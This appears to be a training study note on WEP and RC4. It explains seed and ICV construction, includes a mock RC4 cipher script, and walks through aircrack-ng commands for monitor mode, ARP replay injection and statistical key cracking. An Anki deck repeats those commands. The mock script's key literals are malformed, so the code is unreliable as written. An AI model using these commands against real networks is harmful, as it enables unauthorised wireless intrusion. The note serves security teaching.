# Chain #18: WEP & RC4 — seed, ICV, mock cipher, and practical attacks

## Goal & Scope

Short, hands‑on introduction to WEP and RC4:

- WEP primitives (IV, key sizes, RC4, ICV/CRC32).
- How WEP builds an RC4 seed (IV + key) and encrypts a frame.
- CRC32 / ICV generation and a runnable `mockcipher.py` that demonstrates the full flow.
- Practical attack overview: IV collection, ARP replay, FMS / PTW, and KoreK Chop‑Chop ideas.
- Canonical lab commands (explained) and remediation notes.

---

## Summary (one‑page)

WEP uses a 24‑bit IV concatenated with a per‑device secret key (commonly 40‑bit or 104‑bit) as the RC4 seed. RC4 produces a keystream which XORs with `plaintext || ICV` (ICV = CRC32(plaintext)). The IV is transmitted in clear, and its small size leads to IV reuse; attackers exploit this with statistical (FMS/PTW) or packet‑building attacks (ARP replay) to recover keys quickly.

---

## Key details & canonical commands (explained)

**Canonical dummies used below:**

- Managed Interface: `wlan0`
- Monitor Interface: `wlan0mon`
- AP BSSID: `AA:BB:CC:DD:EE:FF`
- Client MAC: `11:22:33:44:55:66`
- Channel: 6
- Capture Filename: `WPA-01.cap`

### 1) Put interface into monitor mode

```
sudo airmon-ng check kill
```

- Kills interfering services (NetworkManager, `wpa_supplicant`).

```
sudo airmon-ng start wlan0
```

- Starts monitor mode; typical monitor interface is `wlan0mon`.

### 2) Capture only the target AP on channel 6 and write captures

```
airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w WPA
```

- `-c 6`: lock channel to 6.    
- `--bssid`: focus on the AP.
- `-w WPA`: write capture files with prefix `WPA` (creates e.g. `WPA-01.cap`, `WPA-01.ivs`).

### 3) Accelerate IV collection with ARP replay (packet building)

```
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

- `-3`: ARP replay mode — injects forged ARP requests to provoke predictable responses and many IVs.
- `-b`: BSSID of AP. 
- `-h`: source MAC used in forged frames.

**Notes:** requires injection‑capable adapter and may be blocked by AP/client filters. Produces noise.

### 4) Attempt key recovery from IVs

```
aircrack-ng -z -b AA:BB:CC:DD:EE:FF WPA-01.ivs
```

- `-z`: use IV statistical methods (PTW/FMS) on `.ivs` files.
- If cap file used: `aircrack-ng WPA-01.cap -b AA:BB:CC:DD:EE:FF`.

**Interpretation:** aircrack-ng will display candidate keys when the statistical attack succeeds.

---

## Mock cipher: seed + CRC32 + RC4 (runnable)

This mock combines your SeedGen + CRC32 examples into a single script that demonstrates how the IV and key form the RC4 seed, how ICV is created, and how final frame = IV || ciphertext is produced. Save as mockcipher.py and run python3 mockcipher.py.

```python
# mockcipher.py
from Crypto.Random import get_random_bytes
from Crypto.Cipher import ARC4
import zlib

packetplaintext = b'Something Sensitive'
crc32 = zlib.crc32(packetplaintext)
IV = get_random_bytes(3)
key = b''          # 40-bit
Seed64 = IV + key
key104 = b'	

'  # 104-bit
Seed128 = IV + key104
keystream = ARC4.new(Seed64)
keystreamB = ARC4.new(Seed128)
crc32byte = crc32.to_bytes(4, 'big')
ICVMessage = packetplaintext + crc32byte
msg = keystream.encrypt(ICVMessage)
msgB = keystreamB.encrypt(ICVMessage)
finalmsg = IV + msg
finalmsgb = IV + msgB
print('CRC32 Checksum:', crc32)
print('Initialization Vector:', IV)
print('ICV Message:', ICVMessage)
print('Final Message 64-bit Seed:', finalmsg)
```

---

## Short attack taxonomy & when to use each method

- **FMS**: original statistical attack exploiting biased RC4 outputs for weak IVs. Needs many IVs.
- **PTW**: improved statistical attack requiring fewer IVs — preferred when IVs are available.
- **KoreK Chop‑Chop**: per‑packet attack that uses CRC32 behavior to iteratively recover plaintext bytes by observing accept/reject behavior.
- **Packet‑building (ARP replay / fragmentation)**: used to generate IVs quickly when a client responds to forged frames.
- **Per‑packet brute force**: generally impractical except for very small keyspaces/packets.

---

## Defense (short)

- Remove WEP support; migrate to WPA2/WPA3.
- Disable legacy modes on APs when possible.
- Monitor for injection traffic and ARP replay patterns.

---

## Anki Deck (tab-separated, finishes the document)

```text
#separator:tab
#html:true
#guid column:1
#notetype column:2
#deck column:3
#tags column:6

Q8v2N5k1R3	Basic	Ops::WiFi Gym::Chain 18: WEP	Why is WEP vulnerable despite using 40/104-bit keys?	WEP uses a 24-bit IV sent in clear; IV reuse (small IV space) enables statistical attacks (FMS/PTW) that recover keys quickly.	wep
A4m7C2x9L6	Basic	Ops::WiFi Gym::Chain 18: WEP	Which two phases make up the RC4 algorithm?	KSA (Key Scheduling Algorithm) and PRGA (Pseudo-Random Generation Algorithm).	wep
Z1k6H3p8B2	Basic	Ops::WiFi Gym::Chain 18: WEP	How is the RC4 seed formed in WEP (describe bytes)?	By concatenating the 3-byte IV with the device key (e.g., 5 bytes for 40-bit, 13 bytes for 104-bit) to form the seed.	wep
M9t3F6q1S8	Basic	Ops::WiFi Gym::Chain 18: WEP	What does WEP append to the plaintext before encryption?	A 4-byte CRC32 checksum (ICV) is appended to the plaintext before encryption.	wep
V7d1P4n6E3	Basic	Ops::WiFi Gym::Chain 18: WEP	Which Python function computes CRC32 in the mock scripts?	<code>zlib.crc32()</code>	wep
H2c8R5j4W9	Basic	Ops::WiFi Gym::Chain 18: WEP	Which Python class is used to create the RC4 keystream in the mock script?	<code>ARC4.new(seed)</code> (from <code>Crypto.Cipher.ARC4</code>).	wep
K5s9L2a7Y1	Basic	Ops::WiFi Gym::Chain 18: WEP	List the WEP encryption steps in order (short form).	1) Generate IV. 2) Seed = IV||Key. 3) RC4 KSA/PRGA → keystream. 4) CRC32 append → ICVMessage. 5) XOR with keystream → ciphertext. 6) Transmit IV||ciphertext.	wep
N6b3U8e2D5	Basic	Ops::WiFi Gym::Chain 18: WEP	What does the KoreK “Chop-Chop” attack exploit?	It exploits CRC32 validation by trimming/modifying ciphertext bytes and using accept/reject behavior to infer plaintext bytes iteratively.	wep
P3g7J1v9T4	Basic	Ops::WiFi Gym::Chain 18: WEP	Why does attaching the IV in clear weaken WEP?	Attackers know part of RC4’s seed (the IV) and can focus on the remaining key bytes; IV reuse multiplies the advantage.	wep
R8y2D6m4Q7	Basic (type in the answer)	Ops::WiFi Gym::Chain 18: WEP	What command starts monitor mode and creates <code>wlan0mon</code>?	<code>sudo airmon-ng start wlan0</code>	wep
S4j9K2h6M1	Basic (type in the answer)	Ops::WiFi Gym::Chain 18: WEP	What airodump-ng command captures AP <code>AA:BB:CC:DD:EE:FF</code> on channel <code>6</code> and writes prefix <code>WPA</code> (creating <code>WPA-01.cap</code>)?	<code>airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w WPA</code>	wep
T1n6E3w8Z5	Basic (type in the answer)	Ops::WiFi Gym::Chain 18: WEP	What aireplay-ng command runs ARP replay to collect IVs (use canonical dummies)?	<code>aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon</code>	wep
U9a5F1q3C8	Basic (type in the answer)	Ops::WiFi Gym::Chain 18: WEP	What is the aircrack-ng command to try IV-based cracking (PTW/FMS) against <code>WPA-01-01.ivs</code> for BSSID <code>AA:BB:CC:DD:EE:FF</code>?	<code>aircrack-ng -z -b AA:BB:CC:DD:EE:FF WPA-01-01.ivs</code>	wep
W2e7B4t9H6	Basic (type in the answer)	Ops::WiFi Gym::Chain 18: WEP	When using <code>aircrack-ng -z -b AA:BB:CC:DD:EE:FF WPA-01-01.ivs</code>, which flag enables PTW/FMS statistical methods?	<code>-z</code>	wep
Y6p1C8r2V4	Basic	Ops::WiFi Gym::Chain 18: WEP	Which statistical attack usually requires fewer IVs: FMS or PTW?	PTW (Pyshkin-Tews-Weinmann).	wep
J3m8X5k1A9	Basic	Ops::WiFi Gym::Chain 18: WEP	Why do two runs of the mock cipher produce different ciphertexts with the same key bytes?	Because the IV is randomly generated each run, so the RC4 seed and resulting keystream differ.	wep
L7q2H9d4S3	Basic (type in the answer)	Ops::WiFi Gym::Chain 18: WEP	What Python expression converts an integer CRC32 to 4 big-endian bytes?	<code>crc32.to_bytes(4, 'big')</code>	wep
C5r9N1u6P2	Basic	Ops::WiFi Gym::Chain 18: WEP	Give two drawbacks of ARP replay / packet-building attacks.	They are noisy/detectable and may be blocked by AP/client filters; require an injection-capable adapter.	wep
D8f4V2y7K1	Basic	Ops::WiFi Gym::Chain 18: WEP	What is the short defensive recommendation for WEP-enabled networks?	Migrate off WEP (use WPA2/WPA3), disable legacy WEP support, and monitor for injection-like ARP bursts.	wep
B9z3T6a1R8	Basic	Ops::WiFi Gym::Chain 18: WEP	What is the canonical mockcipher filename referenced in this chain?	<code>mockcipher.py</code>	wep
```
